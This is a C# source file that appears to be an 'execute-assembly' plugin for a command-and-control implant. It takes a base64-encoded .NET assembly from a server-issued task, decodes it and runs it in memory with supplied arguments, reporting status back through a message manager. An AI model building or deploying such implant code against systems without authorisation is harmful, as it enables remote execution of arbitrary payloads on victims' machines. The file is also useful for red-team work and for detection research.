﻿using Agent.Interfaces;
using Agent.Models;
using System.Text.Json;
using Agent.Utilities;
using System.Security.Principal;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "execute-assembly";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private List<ConsoleApplicationExecutor> Executors { get; set; }
        private ConsoleApplicationExecutor cae;
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            if(this.cae is not null)
            {
                if (this.cae.IsRunning())
                {
                    messageManager.Write("Task is already running", job.task.id, true, "error");
                    return;
                }
            }

            ExecuteAssemblyArgs args = JsonSerializer.Deserialize<ExecuteAssemblyArgs>(job.task.parameters);

            if (!args.Validate())
            {
                messageManager.Write("Missing Assembly Bytes", job.task.id, true, "error");
                return;
            }

            Task.Run(() =>
            {
                cae = new ConsoleApplicationExecutor(Misc.Base64DecodeToByteArray(args.asm), Misc.SplitCommandLine(args.arguments), job.task.id, messageManager);
                cae.Execute();
            });
        }
    }
}